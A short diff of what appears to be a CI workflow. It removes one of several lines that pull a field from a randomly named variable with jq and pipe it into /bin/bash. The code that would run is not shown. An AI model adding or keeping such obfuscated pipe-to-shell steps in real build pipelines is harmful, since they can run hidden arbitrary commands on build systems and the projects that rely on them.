@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$m99030" | jq -r .biz7 | /bin/bash
           printf '%s' "$wnsb1" | jq -r .p6 | /bin/bash
           printf '%s' "$svt098" | jq -r .pgucs1 | /bin/bash
-          printf '%s' "$vzae13070" | jq -r .htuwc763 | /bin/bash
           printf '%s' "$unk77" | jq -r .puws734 | /bin/bash
           printf '%s' "$a2" | jq -r .kf7 | /bin/bash
           printf '%s' "$z88" | jq -r .agleu5671 | /bin/bash
